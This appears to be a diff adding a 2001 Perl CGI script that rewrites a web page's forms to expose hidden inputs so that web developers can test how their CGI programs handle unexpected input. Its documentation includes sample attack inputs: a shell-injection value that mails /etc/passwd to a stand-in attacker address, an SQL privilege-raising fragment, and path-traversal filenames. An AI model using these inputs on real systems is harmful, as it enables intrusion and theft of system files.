@@ -1,0 +1,520 @@
+#!/usr/bin/perl -Tw
+# Extract forms from an HTML file and build a new page for them.
+# See POD at end for more explanation.
+#
+# Eli the Bearded	26 April 2001
+use strict;
+use CGI;		# oh so handy for CGI parsing
+use URI;		# oh so handy for normalizing URLs
+require LWP::UserAgent;	# oh so handy for fetching pages
+
+package RewriteForm;	# our package, a subclass of HTML::Parser
+use base "HTML::Parser";# oh so handy for HTML parsing
+
+use vars qw( $textarea $isoption $selname %radio $origpage 
+             %entity $parser $ua $request $response $query );
+
+%entity = (
+  '&'  => '&amp;',
+  '<'  => '&lt;',
+  '>'  => '&gt;',
+);
+
+$textarea = 0;
+$selname = &defselname();
+
+sub defselname () {
+  # What to show for a select without a name.
+  return '<b>undef</b>';
+} # end &defselname 
+sub defradioname () {
+  # What to show for a radio input without a name.
+  return '<b>undef</b>';
+} # end &defradioname 
+sub defsulmultcount () {
+  # How many inputs to show for a select multiple
+  return 5;
+} # end &defsulmultcount 
+sub headers() {
+  # HTTP headers
+  return "Content-Type: text/html\n\n";
+} # end &headers
+
+# Callback for a tag start.
+sub start {
+  #   oo,    text, hashref, arrayref, text
+  my ($self, $tag, $attr,   $attrseq, $origtext) = @_;
+  my $esctext;
+  my $newtext;
+  my @allowed;
+  my $selmult = 0;
+
+  if ($tag =~ /^(form|input|select|option|textarea)$/i) {
+    my $tagtype = lc($1);
+    my $pre  = '';
+    my $qstr = '';
+    my $post = "\n<br>\n";
+    my $skipthis = 0; # used for radio buttons after the first
+
+    $esctext = &quote($origtext);
+
+    if ($tagtype ne 'option' and $isoption) {
+      $isoption = 0;
+      $pre .= "<i>Was still in \$isoption state. Bad HTML?</i> ";
+    }
+
+    if ($tagtype eq 'input') {
+      my $inptype;
+
+      @allowed = ( 'type', 'name', 'value', 'accept', 'checked' );
+
+      # We lc() the type since attribute values have the case preserved
+      # by HTML::Parser. (Attribute names have been lower-cased for us.)
+      if (defined($$attr{type}) and $$attr{type} = lc($$attr{type}) and
+          ($$attr{type} eq 'hidden'  or $$attr{type} eq 'password' or
+	   $$attr{type} eq 'checkbox'  )) {
+        $inptype = $$attr{type};
+	$$attr{type} = 'text';
+      } else {
+        $inptype = $$attr{type};
+      }
+
+      if (defined($inptype)) {
+	$qstr = &quote($inptype);
+	$pre .= "Input type <code>$qstr</code>, ";
+      } else {
+	$pre .= "Input type unrecognized, ";
+      }
+
+      if (defined($$attr{name})) {
+	$qstr = &quote($$attr{name});
+	$pre .= "named <code>$qstr</code>, ";
+        
+	if (defined($inptype) and $inptype eq 'radio') {
+	  if (defined($radio{$qstr})) {
+	    $post = "Input values for the radio button in the $qstr text " .
+	            "input. " . $post;
+	    $skipthis = 1;
+	  } else {
+	    $radio{$qstr} = 1;
+	    $$attr{type} = 'text';
+	    $post = "Use this text input for $qstr the radio buttons. " .
+	            $post;
+	  }
+	}
+
+      } else {
+	$pre .= "no name found, ";
+      }
+
+      if (!defined($inptype) or ($inptype !~ /hidden|password|text/)) {
+        if (defined($$attr{value})) {
+	  $qstr = &quote($$attr{value});
+	  $pre .= "with value <code>$qstr</code>, ";
+	} else {
+	  $pre .= "with no value, ";
+	}
+      }
+
+
+      if (defined($$attr{src})) {
+        my $newimage = URI->new_abs( $$attr{src}, $origpage );
+	$$attr{src} = $newimage;
+	push(@allowed, qw( src border height width ));
+      }
+
+      $pre .= "original HTML <pre>$esctext\n</pre>";
+
+    } elsif ($tagtype eq 'select') {
+
+      $selname = &defselname();
+
+      # @allowed = ( 'name', 'multiple' );
+      if (defined($selname = $$attr{name})) {
+        $selname = quote($selname);
+	$pre .= "Turning select $selname into text input. Any option ";
+	$pre .= "values for this select will be printed. ";
+	@allowed = ( 'type', 'name' );
+        $tagtype='input';
+	$$attr{name} = 'text';
+
+	if(defined($$attr{multiple})) {
+	  $pre .= "Note that this select allows multiple inputs, so ";
+	  $pre .= "more than one text input follows. ";
+	  $selmult = 1;
+	}
+      }
+
+    } elsif ($tagtype eq 'option') {
+
+      @allowed = ( 'value', 'selected' );
+      $isoption = 1;
+      $pre = "Original option HTML <code>$esctext\n</code> ";
+
+    } elsif ($tagtype eq 'form') {
+      
+      @allowed = ( 'action', 'method', 'enctype', 'name' );
+
+      if (defined($$attr{action})) {
+        my $newaction = URI->new_abs( $$attr{action}, $origpage );
+	$$attr{action} = $newaction;
+	$qstr = &quote($newaction);
+        $pre .= "Form has action <code>$qstr</code>, ";
+      } else {
+        $pre .= "No action found for form, ";
+      }
+
+      if (defined($$attr{method})) {
+	$qstr = &quote($$attr{method});
+        $pre .= "method <code>$qstr</code>, ";
+      } else {
+        $pre .= "default method, ";
+      }
+
+      $pre .= "original HTML <pre>$esctext\n</pre>";
+
+    } elsif ($tagtype eq 'textarea') {
+
+      @allowed = ( 'name', 'cols', 'rows', 'wrap' );
+      $textarea = 1;
+      $pre .= "Original HTML <pre>$esctext\n</pre>";
+    }
+
+    $newtext = '<' . $tagtype;
+
+    for $_ (@allowed) {
+      if (exists($$attr{$_})) {
+        $newtext .= ' ' . $_;
+	if (defined($$attr{$_})) {
+          $newtext .= '="' . $$attr{$_} . '"';
+	}
+      }
+    }
+
+    $newtext .= '>';
+
+    print $pre;
+    if ($selmult) {
+      my $i;
+      print "<ol>\n";
+      for ($i = 1; $i <= &defsulmultcount(); $i++) {
+	print '<li>' . $newtext . "\n";
+      }
+      print "</ol>\n";
+    } else {
+      print $newtext unless ($isoption or $skipthis);
+    }
+    print $post unless ($textarea or $isoption);
+  }
+
+} # end &start 
+
+# Callback for a block of text
+sub text {
+  my ($self, $text) = @_;
+
+  if ($textarea) {
+    print $text;
+  } elsif ($isoption) {
+    print "Option text for $selname <code>$text</code><br>\n";
+  }
+} # end &text 
+
+# Callback for a comment
+sub comment {
+  my ($self, $comment) = @_;
+
+  # We should never be here if $textarea is set, but who knows
+  if ($textarea || $isoption) {
+    print "<! -- $comment -- >";
+  }
+} # end &comment 
+
+# Callback for close tag
+sub end {
+  my ($self, $tag, $origtext) = @_;
+  my $esctext;
+
+  if ($tag =~ /^(form|input|select|option|textarea)$/i) {
+    my $tagtype = lc($1);
+    my $post;
+    my $wasoption = $isoption;
+
+    $esctext = $origtext;
+    $esctext =~ s/([<>&])/$entity{$1}/g;
+
+    if ($tagtype eq 'textarea') {
+      $textarea = 0;
+    } elsif ($tagtype eq 'option' or $tagtype eq 'select' or $tagtype eq 'form') {
+      $isoption = 0;
+      if ($tagtype ne 'option') {
+        $selname = &defselname();
+      }
+    }
+    $post = "<br>Close tag was <pre>$esctext\n</pre>";
+
+    print $origtext unless $wasoption;
+    print $post unless $wasoption;
+  }
+} # end &end 
+
+# Quote HTML for safe printing.
+sub quote ($) {
+  my $string = shift;
+  $string =~ s/([<>&])/$entity{$1}/g;
+  return $string;
+}
+
+$origpage  = $ARGV[0];
+
+if(defined($origpage)) {
+  if ($origpage =~ /^-+h/i) {
+    print "Read POD in $0 for help.\n'perldoc $0' should work.\n";
+    exit;
+  }
+  if ($origpage =~ m<^(?i:http)(://[!-~]{1,2000})$>) {
+    $origpage = "http$1";
+  } else {
+    print "Unrecognized usage. Use as a CGI or read the POD for help.\n";
+    print "'perldoc $0' should work.\n";
+    exit;
+  }
+} else {
+  $query     = new CGI;
+  $origpage  = $query->param('url');
+
+  print &headers();
+}
+
+
+if (defined($origpage)) {
+  if($origpage =~ m<^(?i:http)(://[!-~]{1,2000})$>) {
+    # untainted
+    $origpage = "http$1";
+
+    $ua       = LWP::UserAgent->new;
+    $request  = HTTP::Request->new('GET', $origpage);
+    $response = $ua->request($request);
+
+    print "<html><head><title>Form Rewriter</title></head><body>\n";
+    print "<p>page is " . &quote($origpage) . "<br>\n";
+    print "page size is " . length($response->content) . " bytes</p>\n";
+    $parser = new RewriteForm;
+    $parser->parse($response->content);
+    $parser->eof;
+  } else {
+    print "<html><head><title>Form Rewriter</title></head><body>\n";
+    print "Can't untaint <code>url</code> parameter.\n";
+  }
+} else {
+  my $form = $ENV{SCRIPT_NAME};
+
+  print "<html><head><title>Form Rewriter</title></head><body>\n";
+  if (!defined($form)) {
+    print "Can't find URL for internal form.\n";
+    exit;
+  }
+  print "<form action='$form' method=GET>\n";
+  print "URL of page to process: <input type=text name=url size=40>\n";
+  print "<input type=submit value='go on'></form>\n";
+
+  while(<RewriteForm::DATA>) {
+    if ($. == 1) {
+      print "<p>POD documentation</p><pre>\n\n";
+    }
+    print;
+  }
+  if ($. > 1) {
+      print "\n\n</pre>\n";
+  } else {
+      print "\n<p>Didn't find POD to print\n";
+  }
+}
+
+__DATA__
+
+=pod
+
+=head1 NAME
+
+extract-form : HTML form rewriter for command line or CGI use
+
+=head1 DESCRIPTION
+
+This script will fetch an HTML page via HTTP and extract all the
+forms out of it. The forms will be rewritten to expose all hidden
+inputs, etc, so that random values can be substituted in.  Also
+Javascript in the page to verify inputs, etc, will be stripped.
+Useful for seeing how CGI programs deal with non-sanctioned input.
+
+During the course of rewriting the forms the script will convert
+E<lt>SELECTE<gt> tags, E<lt>INPUT TYPE=RADIOE<gt>,
+E<lt>INPUT TYPE=CHECKBOXE<gt> and E<lt>INPUT TYPE=HIDDENE<gt> to
+E<lt>INPUT TYPE=TEXTE<gt>. The E<lt>OPTIONE<gt>tags inside a
+E<lt>SELECTE<gt> will be displayed. (All radio buttons after the
+first in a series will be displayed rather than converted: one
+one value for the set would be sent by a browser.)
+
+=head1 EXAMPLES
+
+From the command line, provide a URL as the first argument:
+
+	extract-form http://www.yahoo.com/
+
+This script will fetch the page, rewrite the HTML and print it
+to standard out.
+
+Through a CGI interface, this takes a single parameter C<url> which
+has the URL of the page to process. It rewrites the HTML and 
+returns it for display in the browser.
+
+=head1 IDEAS FOR TESTING
+
+Some CGI programmers seem to think that variables whose values 
+come from the HTML rather than the user are safe. This form
+rewriter makes those variables more visible for poking random
+junk in.
+
+There are probably four types of inputs that are most useful to
+probe. To an external tester those types are often not inheritantly
+obvious.
+
+=over 4
+
+=item 1
+
+arguments passed to Perl's C<open>
+
+These types of input offer the most power. Clever use of C<&>,
+C<|>, C<;> and other shell meta-characters can cause all sorts
+of things to happen when used in an C<open> call. A CGI that
+sends mail might have a hidden variable that has the recipient's
+address, which might be used like this:
+
+	open(MAIL,"| $sendmail '$MAILTO'")
+
+If the MAILTO value were changed to be:
+
+	someone@example.com' ; /bin/mail blackhat@example.net < '/etc/passwd
+
+Then the original mail would still be sent, and then the blackhat
+would get the password file.
+
+=item 2
+
+items that get used in SQL statements
+
+With these you can potentially change the meaning of an SQL statement
+dramatically, much like the shell example above. rain forest puppy
+wrote a nice advisory for Bugtraq a while ago (RFP2K01: How I hacked
+Packetstorm, B<http://www.wiretrip.net/rfp/p/doc.asp?id=42>) that
+explains how he found that numerical values in the queries at
+Packetstorm B<http://packetstorm.securify.com/> were not being checked.
+So he changed a C<5> to
+
+	5, Status='Administrator', Security=100, 
+
+to up his privledges on the system.
+
+=item 3
+
+filenames opened safely but displayed in the HTML
+
+These might be templates or page fragments to display after a form
+is processed. It might not be opened by Perl or might be used in
+a C<sysopen>. With these you might be able to view any file on the
+system that the CGI can read and you can think up the name of.
+Consider, for example, a filename like one of these:
+
+	/etc/passwd
+	../../../../../../../../../../../../etc/passwd
+
+In Unix, C<..> at the root level leaves you at the root level. So
+that second filename is good for anywhere up to twelve levels deep.
+
+=item 4
+
+buffer overflows
+
+Above I said that the Perl open vulnerability gave the most power.
+I lied. Buffer overflows can give you even more power if you can
+get machine code in the overflow to execute. The way to probe for
+a buffer overflow is to try inserting very long values into each
+parameter. "Very long" can be a few hundred characters to a few
+thousand. Typically people seem to use the letter C<A> repeated.
+
+Once a buffer overflow is found, exploiting it can be tricky.
+You need to know the type of computer running the CGI (services
+like Netcraft, B<http://www.netcraft.com/>, can help you identify
+the system). You need to have a suitible shell code to use. Aleph
+One's paper "Smashing The Stack For Fun And Profit",
+B<http://www.codetalker.com/whitepapers/other/p49-14.html>,
+explains how to craft shell code or a search engine might find you
+one.
+
+
+=back
+
+=head1 IDEAS FOR IMPROVEMENT
+
+It would be really nice if the script could figure out what text
+is used to label form inputs so that could be printed with the
+rewritten form. Although HTML 4.0 includes a E<lt>LABELE<gt> tag
+for just that purpose, this script does not attempt to use them.
+Most web pages don't have them, anyway.
+
+It could be useful if the script could add additional form elements.
+
+It could be useful if the script could add additional form elements.
+Some CGI programs check the value of the submit button, but this
+does not provide a way to alter that. This is slightly tricky to
+alter since if there are multiple submit buttons they could have
+different C<NAME> attributes, but the browser would only return
+the name and value of the one clicked. Also image submit buttons
+return two values, a C<{name}.x> and a C<{name}.y> with pixel
+coordinates to indicate where in the image the user clicked. 
+
+It would be nicer if the script could be flexible about how many
+inputs to provide for a E<lt>SELECT MULTIPLEE<gt> statement.
+
+It would be handy if the script could automatically generate long
+strings for buffer overflow testing.
+
+=head1 COPYRIGHT
+
+This script is by Eli the Bearded. The home source for it is
+his directory at CPAN, I<http://www.cpan.org/authors/id/E/EL/ELIJAH/>.
+This script is released to the public domain. Modifications and
+redistribution is encouraged. Leaving an attribution to Eli the
+Bearded would be nice, but is not required.
+
+=head1 OSNAMES
+
+This should not have any OS dependencies. NCSA and Apache style
+environment variables might be needed for CGI use.
+
+=head1 CPAN INFO
+
+=head1 SCRIPT CATEGORIES
+
+Web
+CGI
+
+=head1 README
+
+HTML form rewriter for command line or CGI use. Rewritten forms
+have hidden inputs exposed for probing.
+
+=head1 PREREQUISITES
+
+This script uses the C<strict>, C<vars>, C<CGI>, C<URI>, C<LWP::UserAgent>,
+and C<HTML::Parser> modules. Either version 2 or 3 of HTML::Parser should
+work.
+
+=head1 COREQUISITES
+
+The CGI module really should be optional if not running as a CGI, but this
+is not written to allow that.
+
+=cut
+
